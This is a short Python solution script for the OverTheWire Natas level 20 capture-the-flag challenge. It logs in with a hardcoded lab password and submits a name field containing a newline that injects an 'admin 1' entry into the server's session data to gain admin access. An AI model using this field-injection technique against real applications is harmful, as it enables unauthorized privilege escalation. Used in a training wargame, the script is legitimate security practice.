#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()


response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)

response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)

response = session.post(url, data = {"name": "shenal\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)


